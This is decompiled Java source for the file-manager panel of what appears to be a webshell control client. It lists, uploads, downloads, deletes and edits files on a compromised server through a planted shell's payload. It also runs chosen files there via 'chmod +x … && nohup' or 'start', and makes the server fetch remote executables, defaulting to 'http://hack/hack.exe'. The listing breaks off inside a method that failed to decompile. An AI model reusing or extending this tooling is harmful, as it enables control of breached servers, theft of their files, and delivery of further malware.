/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package core.ui.component;

import core.ApplicationContext;
import core.EasyI18N;
import core.Encoding;
import core.annotation.DisplayName;
import core.imp.Payload;
import core.shell.ShellEntity;
import core.ui.component.DataTree;
import core.ui.component.DataView;
import core.ui.component.ShellRSFilePanel;
import core.ui.component.annotation.ButtonToMenuItem;
import core.ui.component.dialog.FileAttr;
import core.ui.component.dialog.FileDialog;
import core.ui.component.dialog.GFileChooser;
import core.ui.component.dialog.GOptionPane;
import core.ui.component.frame.EditFileFrame;
import core.ui.component.frame.ImageShowFrame;
import core.ui.component.model.FileInfo;
import core.ui.component.model.FileOpertionInfo;
import java.awt.BorderLayout;
import java.awt.CardLayout;
import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.awt.event.ActionEvent;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.List;
import java.util.Vector;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import javax.swing.TransferHandler;
import javax.swing.tree.DefaultMutableTreeNode;
import util.Log;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;

@DisplayName(DisplayName="\u6587\u4ef6\u7ba1\u7406")
public class ShellFileManager
extends JPanel {
    public static final ThreadLocal<Boolean> bigFileThreadLocal = new ThreadLocal();
    private JScrollPane filelJscrollPane;
    private DataTree fileDataTree;
    private JPanel filePanel;
    private JPanel fileOpertionPanel;
    private DefaultMutableTreeNode rootTreeNode;
    private JScrollPane dataViewSplitPane;
    private JScrollPane toolSplitPane;
    private DataView dataView;
    private ShellRSFilePanel rsFilePanel;
    private JPanel dataViewPanel;
    private JPanel toolsPanel;
    @ButtonToMenuItem
    private JButton editFileButton;
    @ButtonToMenuItem
    private JButton editFileNewWindowButton;
    @ButtonToMenuItem
    private JButton editFileInEditFileFrameButton;
    @ButtonToMenuItem
    private JButton showImageFileButton;
    @ButtonToMenuItem
    private JButton uploadButton;
    @ButtonToMenuItem
    private JButton moveButton;
    @ButtonToMenuItem
    private JButton copyFileButton;
    @ButtonToMenuItem
    private JButton copyNameButton;
    @ButtonToMenuItem
    private JButton deleteFileButton;
    @ButtonToMenuItem
    private JButton newFileButton;
    @ButtonToMenuItem
    private JButton newDirButton;
    @ButtonToMenuItem
    private JButton executeFileButton;
    @ButtonToMenuItem
    private JButton refreshButton;
    @ButtonToMenuItem
    private JButton downloadButton;
    @ButtonToMenuItem
    private JButton fileAttrButton;
    @ButtonToMenuItem
    private JButton fileRemoteDownButton;
    @ButtonToMenuItem
    private JButton bigFileDownloadButton;
    @ButtonToMenuItem
    private JButton bigFileUploadButton;
    private JTextField dirField;
    private JPanel dirPanel;
    private JSplitPane jSplitPane1;
    private JSplitPane jSplitPane2;
    private JSplitPane jSplitPane3;
    private Vector<String> dateViewColumnVector;
    private ImageIcon dirIcon;
    private ImageIcon fileIcon;
    private String currentDir;
    private final ShellEntity shellEntity;
    private final Payload payload;
    private final Encoding encoding;

    public ShellFileManager(ShellEntity entity) {
        this.shellEntity = entity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        this.setLayout(new BorderLayout(1, 1));
        this.InitJPanel();
        this.InitEvent();
        this.updateUI();
        this.init(this.shellEntity);
        EasyI18N.installObject(this.dataView);
    }

    public void init(ShellEntity shellEntity) {
        String[] fileRoot = this.payload.listFileRoot();
        for (int i = 0; i < fileRoot.length; ++i) {
            this.fileDataTree.AddNote(fileRoot[i]);
        }
        this.currentDir = functions.formatDir(this.payload.currentDir());
        this.currentDir = this.currentDir.substring(0, 1).toUpperCase() + this.currentDir.substring(1);
        this.dirField.setText(this.currentDir);
        this.fileDataTree.AddNote(this.currentDir);
    }

    private void InitJPanel() {
        this.filePanel = new JPanel();
        this.filePanel.setLayout(new BorderLayout(1, 1));
        this.filelJscrollPane = new JScrollPane();
        this.rootTreeNode = new DefaultMutableTreeNode("Disk");
        this.fileDataTree = new DataTree("", this.rootTreeNode);
        this.fileDataTree.setRootVisible(true);
        this.filelJscrollPane.setViewportView(this.fileDataTree);
        this.filePanel.add(this.filelJscrollPane);
        this.fileOpertionPanel = new JPanel(new CardLayout());
        this.dateViewColumnVector = new Vector();
        this.dateViewColumnVector.add("icon");
        this.dateViewColumnVector.add("name");
        this.dateViewColumnVector.add("type");
        this.dateViewColumnVector.add("lastModified");
        this.dateViewColumnVector.add("size");
        this.dateViewColumnVector.add("permission");
        this.dataViewSplitPane = new JScrollPane();
        this.dataViewPanel = new JPanel();
        this.dataViewPanel.setLayout(new BorderLayout(1, 1));
        this.dataView = new DataView(null, this.dateViewColumnVector, 0, 30);
        this.dataViewSplitPane.setViewportView(this.dataView);
        this.fileOpertionPanel.add("dataView", this.dataViewSplitPane);
        this.rsFilePanel = new ShellRSFilePanel(this.shellEntity, this.fileOpertionPanel, "dataView");
        this.fileOpertionPanel.add("rsFile", this.rsFilePanel);
        this.dataViewPanel.add(this.fileOpertionPanel);
        this.toolSplitPane = new JScrollPane();
        this.toolsPanel = new JPanel();
        this.editFileButton = new JButton("\u5728\u5f53\u524d\u7a97\u53e3\u7f16\u8f91\u6587\u4ef6");
        this.editFileNewWindowButton = new JButton("\u5728\u65b0\u7a97\u53e3\u7f16\u8f91\u6587\u4ef6");
        this.editFileInEditFileFrameButton = new JButton("\u5728\u7f16\u8f91\u5668\u7f16\u8f91\u6b64\u6587\u4ef6");
        this.showImageFileButton = new JButton("\u5728\u65b0\u7a97\u53e3\u663e\u793a\u56fe\u7247");
        this.uploadButton = new JButton("\u4e0a\u4f20");
        this.refreshButton = new JButton("\u5237\u65b0");
        this.moveButton = new JButton("\u79fb\u52a8");
        this.copyFileButton = new JButton("\u590d\u5236");
        this.downloadButton = new JButton("\u4e0b\u8f7d");
        this.copyNameButton = new JButton("\u590d\u5236\u7edd\u5bf9\u8def\u5f84");
        this.deleteFileButton = new JButton("\u5220\u9664\u6587\u4ef6");
        this.newFileButton = new JButton("\u65b0\u5efa\u6587\u4ef6");
        this.newDirButton = new JButton("\u65b0\u5efa\u6587\u4ef6\u5939");
        this.fileAttrButton = new JButton("\u6587\u4ef6\u5c5e\u6027");
        this.fileRemoteDownButton = new JButton("\u8fdc\u7a0b\u4e0b\u8f7d");
        this.executeFileButton = new JButton("\u6267\u884c");
        this.bigFileDownloadButton = new JButton("\u5927\u6587\u4ef6\u4e0b\u8f7d");
        this.bigFileUploadButton = new JButton("\u5927\u6587\u4ef6\u4e0a\u4f20");
        this.toolsPanel.add(this.uploadButton);
        this.toolsPanel.add(this.moveButton);
        this.toolsPanel.add(this.refreshButton);
        this.toolsPanel.add(this.copyFileButton);
        this.toolsPanel.add(this.copyNameButton);
        this.toolsPanel.add(this.deleteFileButton);
        this.toolsPanel.add(this.newFileButton);
        this.toolsPanel.add(this.newDirButton);
        this.toolsPanel.add(this.downloadButton);
        this.toolsPanel.add(this.fileAttrButton);
        this.toolsPanel.add(this.fileRemoteDownButton);
        this.toolsPanel.add(this.executeFileButton);
        this.toolsPanel.add(this.bigFileUploadButton);
        this.toolsPanel.add(this.bigFileDownloadButton);
        this.toolSplitPane.setViewportView(this.toolsPanel);
        this.dirPanel = new JPanel();
        this.dirPanel.setLayout(new BorderLayout(1, 1));
        this.dirField = new JTextField();
        this.dirField.setColumns(100);
        this.dirPanel.add(this.dirField);
        this.dirIcon = new ImageIcon(this.getClass().getResource("/images/folder.png"));
        this.fileIcon = new ImageIcon(this.getClass().getResource("/images/file.png"));
        this.fileDataTree.setLeafIcon(new ImageIcon(this.getClass().getResource("/images/folder.png")));
        this.jSplitPane2 = new JSplitPane();
        this.jSplitPane2.setOrientation(0);
        this.jSplitPane2.setTopComponent(this.dataViewPanel);
        this.jSplitPane2.setBottomComponent(this.toolSplitPane);
        this.jSplitPane3 = new JSplitPane();
        this.jSplitPane3.setOrientation(0);
        this.jSplitPane3.setTopComponent(this.dirPanel);
        this.jSplitPane3.setBottomComponent(this.jSplitPane2);
        this.jSplitPane1 = new JSplitPane();
        this.jSplitPane1.setOrientation(1);
        this.jSplitPane1.setLeftComponent(this.filePanel);
        this.jSplitPane1.setRightComponent(this.jSplitPane3);
        this.add(this.jSplitPane1);
    }

    private void InitEvent() {
        automaticBindClick.bindJButtonClick(this, this);
        automaticBindClick.bindButtonToMenuItem(this, this, this.dataView.getRightClickMenu());
        this.dataView.setActionDblClick(e -> this.dataViewDbClick(e));
        this.fileDataTree.setActionDbclick(e -> this.fileDataTreeDbClick(e));
        this.dirField.addKeyListener(new KeyAdapter(){

            @Override
            public void keyPressed(KeyEvent e) {
                if (e.getKeyChar() == '\n') {
                    ShellFileManager.this.refreshButtonClick(null);
                }
            }
        });
        this.jSplitPane2.setTransferHandler(new TransferHandler(){
            private static final long serialVersionUID = 1L;

            @Override
            public boolean importData(JComponent comp, Transferable t) {
                try {
                    Object o = t.getTransferData(DataFlavor.javaFileListFlavor);
                    if (List.class.isAssignableFrom(o.getClass())) {
                        List list = (List)o;
                        if (list.size() == 1) {
                            Object fileObject = list.get(0);
                            if (File.class.isAssignableFrom(fileObject.getClass())) {
                                File file = (File)fileObject;
                                if (file.canRead() && file.isFile()) {
                                    String uploadFileString = ShellFileManager.this.currentDir + file.getName();
                                    ShellFileManager.this.uploadFile(uploadFileString, file, false);
                                } else {
                                    GOptionPane.showMessageDialog(null, "\u76ee\u6807\u4e0d\u662f\u6587\u4ef6 \u6216\u4e0d\u53ef\u8bfb");
                                }
                            } else {
                                GOptionPane.showMessageDialog(null, "\u76ee\u6807\u4e0d\u662f\u6587\u4ef6");
                            }
                        } else {
                            GOptionPane.showMessageDialog(null, "\u4e0d\u652f\u6301\u591a\u6587\u4ef6\u64cd\u4f5c");
                        }
                    } else {
                        GOptionPane.showMessageDialog(null, "\u4e0d\u652f\u6301\u7684\u64cd\u4f5c");
                    }
                    return true;
                } catch (Exception e) {
                    GOptionPane.showMessageDialog(ShellFileManager.this.shellEntity.getFrame(), e.getMessage(), "\u63d0\u793a", 1);
                    Log.error(e);
                    return false;
                }
            }

            @Override
            public boolean canImport(JComponent comp, DataFlavor[] flavors) {
                for (int i = 0; i < flavors.length; ++i) {
                    if (!DataFlavor.javaFileListFlavor.equals(flavors[i])) continue;
                    return true;
                }
                return false;
            }
        });
    }

    public void dataViewDbClick(MouseEvent e) {
        this.editFileInEditFileFrameButtonClick(null);
    }

    public void editFileNewWindowButtonClick(ActionEvent e) {
        Vector rowVector = this.dataView.GetSelectRow();
        String fileType = (String)rowVector.get(2);
        String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
        long fileSize = ((FileInfo)rowVector.get(4)).getSize();
        if (fileType.equals("file")) {
            ShellRSFilePanel shellRSFilePanel = new ShellRSFilePanel(this.shellEntity, null, "editFileNewWindow");
            JFrame frame = new JFrame("editFile");
            frame.add(shellRSFilePanel);
            shellRSFilePanel.rsFile(fileNameString);
            functions.setWindowSize(frame, 700, 800);
            frame.setLocationRelativeTo(null);
            frame.setVisible(true);
            frame.setDefaultCloseOperation(2);
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u76ee\u6807\u662f\u6587\u4ef6\u5939", "\u8b66\u544a", 2);
        }
    }

    public void editFileButtonClick(ActionEvent e) {
        Vector rowVector = this.dataView.GetSelectRow();
        String fileType = (String)rowVector.get(2);
        String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
        long fileSize = ((FileInfo)rowVector.get(4)).getSize();
        if (fileType.equals("dir")) {
            this.refreshFile(this.dirField.getText() + "/" + rowVector.get(1));
        } else if (fileSize < 0x100000L) {
            this.rsFilePanel.rsFile(fileNameString);
            ((CardLayout)this.fileOpertionPanel.getLayout()).show(this.fileOpertionPanel, "rsFile");
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u76ee\u6807\u6587\u4ef6\u5927\u5c0f\u5927\u4e8e1MB", "\u63d0\u793a", 2);
        }
    }

    public void editFileInEditFileFrameButtonClick(ActionEvent e) {
        Vector rowVector = this.dataView.GetSelectRow();
        String fileType = (String)rowVector.get(2);
        String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
        long fileSize = ((FileInfo)rowVector.get(4)).getSize();
        if (fileType.equals("file")) {
            ShellRSFilePanel shellRSFilePanel = new ShellRSFilePanel(this.shellEntity, null, "editFileNewWindow");
            shellRSFilePanel.rsFile(fileNameString);
            EditFileFrame.OpenNewEdit(shellRSFilePanel);
        } else {
            this.refreshFile(this.dirField.getText() + "/" + rowVector.get(1));
        }
    }

    public void showImageFileButtonClick(ActionEvent e) {
        Vector rowVector = this.dataView.GetSelectRow();
        String fileType = (String)rowVector.get(2);
        String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
        long fileSize = ((FileInfo)rowVector.get(4)).getSize();
        if (fileType.equals("dir")) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u76ee\u6807\u662f\u6587\u4ef6\u5939", "\u8b66\u544a", 2);
        } else if (fileSize < 0x300000L) {
            byte[] fileContent = null;
            try {
                fileContent = this.payload.downloadFile(fileNameString);
                ImageShowFrame.showImageDiaolog(new ImageIcon(ImageIO.read(new ByteArrayInputStream(fileContent))));
            } catch (Exception err) {
                Log.error(err);
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0b\u8f7d\u6587\u4ef6\u5931\u8d25", "\u8b66\u544a", 0);
            }
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u76ee\u6807\u6587\u4ef6\u5927\u5c0f\u5927\u4e8e3MB", "\u63d0\u793a", 2);
        }
    }

    public void fileDataTreeDbClick(MouseEvent e) {
        this.refreshFile(this.fileDataTree.GetSelectFile());
    }

    public void moveButtonClick(ActionEvent e) {
        String fileString = this.getSelectdFile();
        FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "reName", fileString, fileString);
        if (fileOpertionInfo.getOpertionStatus().booleanValue() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo.getDestFileName().trim().length() > 0) {
            String destFileString;
            String srcFileString = fileOpertionInfo.getSrcFileName();
            boolean state = this.payload.moveFile(srcFileString, destFileString = fileOpertionInfo.getDestFileName());
            if (state) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), String.format(EasyI18N.getI18nString("\u79fb\u52a8\u6210\u529f  %s >> %s"), fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName()), "\u63d0\u793a", 1);
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4fee\u6539\u5931\u8d25", "\u63d0\u793a", 2);
            }
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4fe1\u606f\u586b\u5199\u4e0d\u5b8c\u6574", "\u63d0\u793a", 2);
        }
    }

    public void copyFileButtonClick(ActionEvent e) {
        String fileString = this.getSelectdFile();
        FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "copy", fileString, fileString);
        if (fileOpertionInfo.getOpertionStatus().booleanValue() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo.getDestFileName().trim().length() > 0) {
            boolean state = this.payload.copyFile(fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName());
            if (state) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), String.format(EasyI18N.getI18nString("\u590d\u5236\u6210\u529f  %s <<>> %s"), fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName()), "\u63d0\u793a", 1);
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u590d\u5236\u5931\u8d25", "\u63d0\u793a", 2);
            }
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4fe1\u606f\u586b\u5199\u4e0d\u5b8c\u6574", "\u63d0\u793a", 2);
        }
    }

    public void copyNameButtonClick(ActionEvent e) {
        Vector vector = this.dataView.GetSelectRow();
        if (vector != null) {
            String fileString = functions.formatDir(this.currentDir) + vector.get(1);
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(fileString), null);
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u5df2\u7ecf\u590d\u5236\u5230\u526a\u8f91\u7248");
        }
    }

    public void deleteFileButtonClick(ActionEvent e) {
        String fileString = this.getSelectdFile();
        String inputFile = GOptionPane.showInputDialog("\u8f93\u5165\u6587\u4ef6\u540d\u79f0", (Object)fileString);
        if (inputFile != null) {
            boolean state = this.payload.deleteFile(inputFile);
            if (state) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u5220\u9664\u6210\u529f", "\u63d0\u793a", 1);
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u5220\u9664\u5931\u8d25", "\u63d0\u793a", 2);
            }
        } else {
            Log.log("\u7528\u6237\u53d6\u6d88\u9009\u62e9.....", new Object[0]);
        }
    }

    private String getSelectdFile() {
        String fileString = "";
        try {
            fileString = functions.formatDir(this.currentDir) + this.dataView.getValueAt(this.dataView.getSelectedRow(), 1);
        } catch (Exception exception) {
            // empty catch block
        }
        return fileString;
    }

    public void newFileButtonClick(ActionEvent e) {
        String fileString = functions.formatDir(this.currentDir) + "newFile";
        String inputFile = GOptionPane.showInputDialog("\u8f93\u5165\u6587\u4ef6\u540d\u79f0", (Object)fileString);
        if (inputFile != null) {
            boolean state = this.payload.newFile(inputFile);
            if (state) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u65b0\u5efa\u6587\u4ef6\u6210\u529f", "\u63d0\u793a", 1);
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u65b0\u5efa\u6587\u4ef6\u5931\u8d25", "\u63d0\u793a", 2);
            }
        } else {
            Log.log("\u7528\u6237\u53d6\u6d88\u9009\u62e9.....", new Object[0]);
        }
    }

    public void uploadButtonClick(ActionEvent e) {
        new Thread(new Runnable(){

            @Override
            public void run() {
                ApplicationContext.isShowHttpProgressBar.set(new Boolean(true));
                if (ApplicationContext.isGodMode()) {
                    ShellFileManager.this.GUploadFile(false);
                } else {
                    ShellFileManager.this.UploadFile(false);
                }
            }
        }).start();
    }

    public void bigFileUploadButtonClick(ActionEvent e) {
        new Thread(new Runnable(){

            @Override
            public void run() {
                if (ApplicationContext.isGodMode()) {
                    ShellFileManager.this.GUploadFile(true);
                } else {
                    ShellFileManager.this.UploadFile(true);
                }
            }
        }).start();
    }

    public void refreshButtonClick(ActionEvent e) {
        this.refreshFile(functions.formatDir(this.dirField.getText()));
    }

    public void executeFileButtonClick(ActionEvent e) {
        String fileString = this.getSelectdFile();
        String inputFile = GOptionPane.showInputDialog("\u8f93\u5165\u53ef\u6267\u884c\u6587\u4ef6\u540d\u79f0", (Object)fileString);
        if (inputFile != null) {
            String cmdString = null;
            cmdString = !this.payload.isWindows() ? String.format("chmod +x %s && nohup %s > /dev/null", inputFile, inputFile) : String.format("start %s ", inputFile);
            final String executeCmd = cmdString;
            new Thread(new Runnable(){

                @Override
                public void run() {
                    Log.log(String.format("Execute Command Start As %s", executeCmd), new Object[0]);
                    String result = ShellFileManager.this.payload.execCommand(executeCmd);
                    Log.log(String.format("execute Command End %s", result), new Object[0]);
                }
            }).start();
        } else {
            Log.log("\u7528\u6237\u53d6\u6d88\u9009\u62e9.....", new Object[0]);
        }
    }

    public void downloadButtonClick(ActionEvent e) {
        new Thread(new Runnable(){

            @Override
            public void run() {
                ApplicationContext.isShowHttpProgressBar.set(new Boolean(true));
                if (ApplicationContext.isGodMode()) {
                    ShellFileManager.this.GDownloadFile(false);
                } else {
                    ShellFileManager.this.downloadFile(false);
                }
            }
        }).start();
    }

    public void bigFileDownloadButtonClick(ActionEvent e) {
        new Thread(new Runnable(){

            @Override
            public void run() {
                if (ApplicationContext.isGodMode()) {
                    ShellFileManager.this.GDownloadFile(true);
                } else {
                    ShellFileManager.this.downloadFile(true);
                }
            }
        }).start();
    }

    public void newDirButtonClick(ActionEvent e) {
        String fileString = functions.formatDir(this.currentDir) + "newDir";
        String inputFile = GOptionPane.showInputDialog("\u8f93\u5165\u6587\u4ef6\u5939\u540d\u79f0", (Object)fileString);
        if (inputFile != null) {
            boolean state = this.payload.newDir(inputFile);
            if (state) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u65b0\u5efa\u6587\u4ef6\u5939\u6210\u529f", "\u63d0\u793a", 1);
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u65b0\u5efa\u6587\u4ef6\u5939\u5931\u8d25", "\u63d0\u793a", 2);
            }
        } else {
            Log.log("\u7528\u6237\u53d6\u6d88\u9009\u62e9.....", new Object[0]);
        }
    }

    public void fileAttrButtonClick(ActionEvent e) {
        String fileString = this.getSelectdFile();
        String filePermission = (String)this.dataView.getValueAt(this.dataView.getSelectedRow(), 5);
        String fileTime = (String)this.dataView.getValueAt(this.dataView.getSelectedRow(), 3);
        FileAttr attr = new FileAttr(this.shellEntity, fileString, filePermission, fileTime);
    }

    public void fileRemoteDownButtonClick(ActionEvent e) {
        final FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "fileRemoteDown", "http://hack/hack.exe", this.currentDir + "hack.exe");
        if (fileOpertionInfo.getOpertionStatus().booleanValue()) {
            new Thread(new Runnable(){

                @Override
                public void run() {
                    boolean state = ShellFileManager.this.payload.fileRemoteDown(fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName());
                    if (state) {
                        GOptionPane.showMessageDialog(ShellFileManager.this.shellEntity.getFrame(), "\u8fdc\u7a0b\u4e0b\u8f7d\u6210\u529f", "\u63d0\u793a", 1);
                    } else {
                        GOptionPane.showMessageDialog(ShellFileManager.this.shellEntity.getFrame(), "\u8fdc\u7a0b\u4e0b\u8f7d\u5931\u8d25", "\u63d0\u793a", 2);
                    }
                }
            }).start();
        }
    }

    private Vector<Vector<Object>> getAllFile(String filePathString) {
        filePathString = functions.formatDir(filePathString);
        String fileDataString = this.payload.getFile(filePathString);
        String[] rowStrings = fileDataString.split("\n");
        Vector<Vector<Object>> rows = new Vector<Vector<Object>>();
        if (rowStrings[0].equals("ok")) {
            rows = new Vector();
            this.fileDataTree.AddNote(rowStrings[1]);
            this.currentDir = functions.formatDir(rowStrings[1]);
            this.dirField.setText(functions.formatDir(rowStrings[1]));
            for (int i = 2; i < rowStrings.length; ++i) {
                String[] fileTypes = rowStrings[i].split("\t");
                Vector<Object> row = new Vector<Object>();
                if (fileTypes.length == 5) {
                    if (fileTypes[1].equals("0")) {
                        row.add(this.dirIcon);
                        this.fileDataTree.AddNote(this.currentDir + fileTypes[0]);
                    } else {
                        row.add(this.fileIcon);
                    }
                    row.add(fileTypes[0]);
                    row.add(fileTypes[1].equals("0") ? "dir" : "file");
                    row.add(fileTypes[2]);
                    row.add(new FileInfo(fileTypes[3]));
                    row.add(fileTypes[4]);
                    rows.add(row);
                    continue;
                }
                Log.error("\u683c\u5f0f\u4e0d\u5339\u914d ," + rowStrings[i]);
            }
        } else {
            Log.error(fileDataString);
            Log.error("\u76ee\u6807\u8fd4\u56de\u5f02\u5e38,\u65e0\u6cd5\u6b63\u5e38\u683c\u5f0f\u5316\u6570\u636e!");
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), fileDataString);
        }
        return rows;
    }

    private synchronized void refreshFile(String filePathString) {
        Vector<Vector<Object>> rowsVector = this.getAllFile(filePathString);
        this.dataView.AddRows(rowsVector);
        this.dataView.getColumnModel().getColumn(0).setMaxWidth(35);
        this.dataView.getModel().fireTableDataChanged();
    }

    private void GUploadFile(boolean bigFileUpload) {
        FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "upload", "", "");
        if (fileOpertionInfo.getOpertionStatus().booleanValue() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo.getDestFileName().trim().length() > 0) {
            if (fileOpertionInfo.getDestFileName().length() > 0) {
                this.uploadFile(fileOpertionInfo.getDestFileName(), new File(fileOpertionInfo.getSrcFileName()), bigFileUpload);
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0a\u4f20\u8def\u5f84\u4e3a\u7a7a", "\u63d0\u793a", 2);
            }
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4fe1\u606f\u586b\u5199\u4e0d\u5b8c\u6574", "\u63d0\u793a", 2);
        }
    }

    private void UploadFile(boolean bigFileUpload) {
        GFileChooser chooser = new GFileChooser();
        chooser.setFileSelectionMode(0);
        boolean flag = 0 == chooser.showDialog(new JLabel(), "\u9009\u62e9");
        File selectdFile = chooser.getSelectedFile();
        if (flag && selectdFile != null) {
            String uploadFileString = this.currentDir + selectdFile.getName();
            this.uploadFile(uploadFileString, selectdFile, bigFileUpload);
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4fe1\u606f\u586b\u5199\u4e0d\u5b8c\u6574", "\u63d0\u793a", 2);
        }
    }

    public void uploadFile(String uploadFileString, File selectdFile, boolean bigFileUpload) {
        byte[] data = new byte[]{};
        Log.log(String.format("%s starting %s -> %s\t threadId: %s", "upload", selectdFile, uploadFileString, Thread.currentThread().getId()), new Object[0]);
        boolean state = false;
        if (bigFileUpload) {
            state = this.uploadBigFile(uploadFileString, selectdFile);
        } else {
            try {
                FileInputStream fileInputStream = new FileInputStream(selectdFile);
                data = functions.readInputStream(fileInputStream);
                fileInputStream.close();
            } catch (FileNotFoundException e1) {
                Log.error(e1);
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u6587\u4ef6\u4e0d\u5b58\u5728", "\u63d0\u793a", 2);
            } catch (IOException e1) {
                Log.error(e1);
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), e1.getMessage(), "\u63d0\u793a", 2);
            }
            state = this.payload.uploadFile(uploadFileString, data);
        }
        if (state) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0a\u4f20\u6210\u529f", "\u63d0\u793a", 1);
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0a\u4f20\u5931\u8d25", "\u63d0\u793a", 2);
        }
        Log.log(String.format("%s finish \t threadId: %s", "upload", Thread.currentThread().getId()), new Object[0]);
    }

    private void GDownloadFile(boolean bigFileDownload) {
        String file = this.getSelectdFile();
        FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "download", file, "");
        if (fileOpertionInfo.getOpertionStatus().booleanValue() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo.getDestFileName().trim().length() > 0) {
            if (fileOpertionInfo.getDestFileName().length() > 0) {
                this.downloadFile(fileOpertionInfo.getSrcFileName(), new File(fileOpertionInfo.getDestFileName()), bigFileDownload);
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0b\u8f7d\u8def\u5f84\u4e3a\u7a7a", "\u63d0\u793a", 2);
            }
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4fe1\u606f\u586b\u5199\u4e0d\u5b8c\u6574", "\u63d0\u793a", 2);
        }
    }

    private void downloadFile(boolean bigFileDownload) {
        GFileChooser chooser = new GFileChooser();
        chooser.setFileSelectionMode(0);
        boolean flag = 0 == chooser.showDialog(new JLabel(), "\u9009\u62e9");
        File selectdFile = chooser.getSelectedFile();
        String srcFile = this.getSelectdFile();
        if (flag && srcFile != null && srcFile.trim().length() > 0) {
            if (selectdFile != null) {
                this.downloadFile(srcFile, selectdFile, bigFileDownload);
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4fe1\u606f\u586b\u5199\u4e0d\u5b8c\u6574", "\u63d0\u793a", 2);
            }
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u672a\u9009\u4e2d\u4e0b\u8f7d\u6587\u4ef6", "\u63d0\u793a", 2);
        }
    }

    private void downloadFile(String srcFileString, File destFile, boolean bigFileDownload) {
        byte[] data = new byte[]{};
        Log.log(String.format("%s starting %s -> %s\t threadId: %s", "download", srcFileString, destFile, Thread.currentThread().getId()), new Object[0]);
        boolean state = false;
        if (bigFileDownload) {
            state = this.downloadBigFile(srcFileString, destFile);
        } else {
            data = this.payload.downloadFile(srcFileString);
            state = functions.filePutContent(destFile, data);
        }
        if (state) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0b\u8f7d\u6210\u529f", "\u63d0\u793a", 1);
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0b\u8f7d\u5931\u8d25", "\u63d0\u793a", 2);
        }
        Log.log(String.format("%s finish \t threadId: %s", "download", Thread.currentThread().getId()), new Object[0]);
    }

    /*
     * Exception decompiling
     */
    private boolean downloadBigFile(String srcFileString, File destFile) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [5[WHILELOOP], 3[CATCHBLOCK], 0[TRYBLOCK], 6[UNCONDITIONALDOLOOP]], but top level block is 2[TRYBLOCK]
